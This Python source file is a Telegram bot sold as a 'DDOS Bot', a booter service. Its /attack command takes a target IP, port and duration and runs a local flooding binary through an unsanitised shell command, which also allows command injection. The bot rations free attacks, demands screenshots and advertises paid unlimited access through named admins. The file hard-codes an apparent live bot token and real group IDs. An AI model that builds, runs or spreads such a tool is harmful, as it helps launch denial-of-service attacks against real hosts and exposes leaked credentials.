#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading

# Bot configuration
bot = telebot.TeleBot('7985414018:AAEFOyaJKpf9eHebgOO_7BG8P0XLr0jA28c')  # Replace with your actual bot token
ADMIN_IDS = {"1866961136", "1807014348"}
GROUP_ID = "-1002328886935 , -1002669651081"  # Example group ID, bot works in any group
CHANNEL_USERNAME = "@DDOS_SERVER69"
PAID_CHANNEL = "@DDOS_SERVER69"
CONTACT_ADMINS = ["@Rohan2349", "@Sadiq9869"]

# Constants
COOLDOWN_TIME = 0
ATTACK_LIMIT = 5
MAX_DURATION = 180
MUTE_DURATION = 86400  # 24 hours in seconds for abuse mute

# Data storage
USER_FILE = "users.txt"
FEEDBACK_FILE = "feedback_photos.txt"
FEEDBACK_LOG_FILE = "feedback_log.txt"
GROUPS_FILE = "groups.txt"  # New file to store group IDs

# Global variables
user_data = {}
group_attacks = {}
pending_feedback = {}
active_attacks = {}  # For tracking attack processes
global_last_attack_time = None
feedback_photo_ids = set()  # Store unique photo IDs
group_ids = set()  # Track all groups bot is in
ABUSE_WORDS = {"bsdk", "teri maa ki chut", "lund", "selling", "buy"}

# Random Image URLs (unchanged)
image_urls = [
    "https://envs.sh/g7a.jpg", "https://envs.sh/g7e.jpg", "https://envs.sh/g7i.jpg",
    "https://envs.sh/g7m.jpg", "https://envs.sh/g7q.jpg", "https://envs.sh/g7u.jpg",
    "https://envs.sh/g7y.jpg", "https://envs.sh/VwQ.jpg", "https://envs.sh/VwU.jpg",
    "https://envs.sh/VwY.jpg", "https://envs.sh/Vwc.jpg"
]

def load_users():
    """Load user data from file."""
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

def save_users():
    """Save user data to file."""
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

def load_feedback_photos():
    """Load previously submitted feedback photo IDs from file."""
    try:
        with open(FEEDBACK_FILE, "r") as file:
            for line in file:
                feedback_photo_ids.add(line.strip())
    except FileNotFoundError:
        pass

def save_feedback_photo(photo_id, user_id):
    """Save a new feedback photo ID to file with timestamp and user ID."""
    timestamp = datetime.datetime.now().isoformat()
    with open(FEEDBACK_FILE, "a") as file:
        file.write(f"{photo_id}\n")
    with open(FEEDBACK_LOG_FILE, "a") as log_file:
        log_file.write(f"{timestamp},{user_id},{photo_id}\n")
    feedback_photo_ids.add(photo_id)

def reset_feedback_photos():
    """Reset the feedback photo IDs by clearing the set and file."""
    global feedback_photo_ids
    feedback_photo_ids.clear()
    with open(FEEDBACK_FILE, "w") as file:
        file.truncate(0)

def load_groups():
    """Load group IDs from file."""
    try:
        with open(GROUPS_FILE, "r") as file:
            for line in file:
                group_ids.add(line.strip())
    except FileNotFoundError:
        pass

def save_groups():
    """Save group IDs to file."""
    with open(GROUPS_FILE, "w") as file:
        for group_id in group_ids:
            file.write(f"{group_id}\n")

def is_user_in_channel(user_id):
    """Check if user is in the channel."""
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def contains_abuse(text):
    """Check if the message contains any abuse words."""
    text_lower = text.lower()
    return any(abuse_word in text_lower for abuse_word in ABUSE_WORDS)

@bot.message_handler(commands=['contact'])
def handle_contact(message):
    contact_text = f"""
📞 **Need Help or Want Premium Access?**  
🔥 Contact our admins:  
👤 {CONTACT_ADMINS[0]}  
👤 {CONTACT_ADMINS[1]}  
💎 DM to buy paid bot access for unlimited attacks!  
🌟 Join {PAID_CHANNEL} for premium features!
"""
    bot.reply_to(message, contact_text)

@bot.message_handler(commands=['help'])
def handle_help(message):
    help_text = """
🌟 **DDOS Bot Commands** 🌟
/attack <IP> <PORT> <TIME> - Start an attack
/stop - [Admin] Stop ongoing attack
/check_cooldown - Check global cooldown
/check_remaining_attack - See remaining attacks
/contact - Get help or buy premium
/broadcast <message> - [Admin] Send message to all groups
/reset <user_id> - [Admin] Reset user attacks
/setcooldown <seconds> - [Admin] Set cooldown
/viewusers - [Admin] View all users
/shutdown - [Admin] Stop the bot
📸 Send screenshot after attack as feedback
🔥 Join @DDOS_SERVER69 to use!
💎 Get unlimited: BUY FROM @Rohan2349 or  @Sadiq9869
"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    group_id = str(message.chat.id)
    is_admin = user_id in ADMIN_IDS
    command = message.text.split()

    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 Use in groups only!")
        return

    # Add group to tracked groups
    group_ids.add(group_id)
    save_groups()

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ Join first!\n🔗 {CHANNEL_USERNAME}")
        return

    if not is_admin and pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 Send screenshot first!")
        return

    group_attacks.setdefault(group_id, False)
    if group_attacks[group_id]:
        bot.reply_to(message, "⚠️ Attack in progress in this group!")
        return
    
    group_attacks[group_id] = True

    if not is_admin:
        user_data.setdefault(user_id, {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None})
        user = user_data[user_id]
        if user['attacks'] >= ATTACK_LIMIT:
            promotion_msg = f"❌ Limit reached!\n💎 Get unlimited attacks at {PAID_CHANNEL}\n🔥 DM {CONTACT_ADMINS[0]} or {CONTACT_ADMINS[1]} to buy!"
            bot.reply_to(message, promotion_msg)
            group_attacks[group_id] = False
            return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <IP> <PORT> <TIME>")
        group_attacks[group_id] = False
        return

    target, port, time_duration = command[1], command[2], command[3]
    
    try:
        port = int(port)
        time_duration = int(time_duration)
        if time_duration > MAX_DURATION:
            bot.reply_to(message, f"🚫 Max duration: {MAX_DURATION}s")
            group_attacks[group_id] = False
            return
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be integers!")
        group_attacks[group_id] = False
        return

    profile_photos = bot.get_user_profile_photos(user_id)
    profile_pic = profile_photos.photos[0][-1].file_id if profile_photos.total_count > 0 else None
    
    if not profile_pic:
        bot.reply_to(message, "❌ Set a profile picture!")
        group_attacks[group_id] = False
        return

    remaining_attacks = "Unlimited" if is_admin else (ATTACK_LIMIT - user_data[user_id]['attacks'] - 1)
    bot.send_photo(message.chat.id, profile_pic, 
                  caption=f"👤 User: @{user_name}\n💥 Attack Started!\n🎯 Target: {target}:{port}\n⏳ Duration: {time_duration}s\n⚡ Remaining: {remaining_attacks}")

    if not is_admin:
        pending_feedback[user_id] = True

    full_command = f"./Rohan {target} {port} {time_duration} 512 1200"
    try:
        attack_process = subprocess.Popen(full_command, shell=True)
        active_attacks[group_id] = attack_process
        
        attack_process.wait()
        
        if not is_admin:
            user_data[user_id]['attacks'] += 1
            save_users()
            remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        else:
            remaining_attacks = "Unlimited"
        
        bot.send_message(message.chat.id, 
                        f"✅ Attack Complete!\n🎯 {target}:{port}\n⏳ {time_duration}s\n⚡ Remaining: {remaining_attacks}")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error: {e}")
        if not is_admin:
            pending_feedback[user_id] = False
    finally:
        group_attacks[group_id] = False
        if group_id in active_attacks:
            del active_attacks[group_id]

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = str(message.from_user.id)
    group_id = str(message.chat.id)
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 Use in groups only!")
        return
    
    if group_id not in active_attacks or not group_attacks.get(group_id, False):
        bot.reply_to(message, "❌ No active attack in this group!")
        return
    
    attack_process = active_attacks[group_id]
    attack_process.terminate()
    time.sleep(1)
    if attack_process.poll() is None:
        attack_process.kill()
    
    group_attacks[group_id] = False
    del active_attacks[group_id]
    
    bot.reply_to(message, "🛑 Attack stopped by admin!")

@bot.message_handler(commands=['broadcast'])
def handle_broadcast(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "⚠️ Usage: /broadcast <message>")
        return
    
    broadcast_msg = command[1]
    failed_groups = []
    
    for group_id in group_ids:
        try:
            bot.send_message(group_id, f"📢 **Admin Broadcast**\n{broadcast_msg}")
        except Exception as e:
            failed_groups.append(group_id)
            print(f"Failed to send to {group_id}: {e}")
    
    if failed_groups:
        bot.reply_to(message, f"✅ Broadcast sent, but failed for {len(failed_groups)} groups.")
    else:
        bot.reply_to(message, "✅ Broadcast sent to all groups!")

@bot.message_handler(commands=['shutdown'])
def handle_shutdown(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    
    # Broadcast shutdown message to all groups
    shutdown_msg = "🔴 **Bot Shutdown Notice**\nThe bot is shutting down now. Thank you for using our services!"
    failed_groups = []
    
    for group_id in group_ids:
        try:
            bot.send_message(group_id, shutdown_msg)
        except Exception as e:
            failed_groups.append(group_id)
            print(f"Failed to send shutdown to {group_id}: {e}")
    
    bot.reply_to(message, "🔴 Bot shutting down... Shutdown notice sent!")
    save_users()
    save_groups()
    bot.stop_polling()
    exit(0)

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "👑 Admin feedback not required!")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❌ Join first!\n🔗 {CHANNEL_USERNAME}")
        return

    if not pending_feedback.get(user_id, False):
        bot.reply_to(message, "❌ No pending feedback!")
        return

    photo_file_unique_id = message.photo[-1].file_unique_id
    user_data.setdefault(user_id, {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None})
    
    if photo_file_unique_id in feedback_photo_ids:
        user_data[user_id]['attacks'] = min(user_data[user_id]['attacks'] + 1, ATTACK_LIMIT)
        save_users()
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        warning_msg = (
            f"⚠️ **WARNING: Duplicate Screenshot Detected!**\n"
            f"📸 This photo was submitted before.\n"
            f"❌ 1 attack deducted as penalty.\n"
            f"⚡ Remaining attacks: {remaining_attacks}\n"
            f"ℹ️ Please submit a new screenshot next time!"
        )
        bot.reply_to(message, warning_msg)
        return

    pending_feedback[user_id] = False
    save_feedback_photo(photo_file_unique_id, user_id)
    bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
    bot.send_message(CHANNEL_USERNAME, 
                    f"📸 Feedback Received!\n👤 User: {user_name}\n🆔 ID: {user_id}")
    remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
    bot.reply_to(message, 
                 f"✅ Feedback accepted!\n"
                 f"📸 New screenshot verified.\n"
                 f"⚡ Next attack ready!\n"
                 f"ℹ️ Remaining attacks: {remaining_attacks}")

@bot.message_handler(func=lambda message: True)
def handle_abuse_detection(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    
    if user_id in ADMIN_IDS:
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        return
    
    if contains_abuse(message.text):
        try:
            bot.restrict_chat_member(
                chat_id, user_id, until_date=int(time.time()) + MUTE_DURATION,
                can_send_messages=False, can_send_media_messages=False,
                can_send_other_messages=False, can_add_web_page_previews=False
            )
            bot.kick_chat_member(chat_id, user_id)
            bot.reply_to(message, 
                        f"🚫 User @{message.from_user.username or user_id} has been muted for 24 hours and banned!\n"
                        f"Reason: Using abusive language")
            bot.delete_message(chat_id, message.message_id)
        except Exception as e:
            print(f"Error banning user {user_id}: {e}")
            bot.reply_to(message, "⚠️ Abuse detected but failed to ban. Contact an admin!")

@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"⏳ Cooldown: {remaining_time}s remaining")
    else:
        bot.reply_to(message, "✅ No cooldown! Attack ready!")

@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "⚡ You have unlimited attacks as an admin!")
    else:
        remaining = ATTACK_LIMIT - user_data.get(user_id, {'attacks': 0})['attacks']
        bot.reply_to(message, f"⚡ You have {remaining} attacks remaining today!")

@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /reset <user_id>")
        return
    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"✅ Attacks reset for user {user_id}")
    else:
        bot.reply_to(message, f"❌ No data for user {user_id}")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /setcooldown <seconds>")
        return
    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"✅ Cooldown set to {COOLDOWN_TIME} seconds")
    except ValueError:
        bot.reply_to(message, "❌ Provide a valid number!")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only!")
        return
    user_list = "\n".join([f"ID: {uid}, Attacks: {data['attacks']}" for uid, data in user_data.items()])
    bot.reply_to(message, f"📋 Users:\n{user_list or 'No users'}")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""
🌟🔥 **Welcome, {user_name}!** 🔥🌟
🚀 World's Best DDOS Bot!
⚡ Dominate the web!
🔗 Join: {CHANNEL_USERNAME}
💎 Premium: {PAID_CHANNEL}
📞 Help: {CONTACT_ADMINS[0]}, {CONTACT_ADMINS[1]}
"""
    bot.reply_to(message, response)

def auto_reset():
    """Reset attacks and feedback photos daily at midnight."""
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()
        reset_feedback_photos()
        print("Midnight reset completed: Attacks and feedback photos cleared.")

reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load data at startup
load_users()
load_feedback_photos()
load_groups()

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)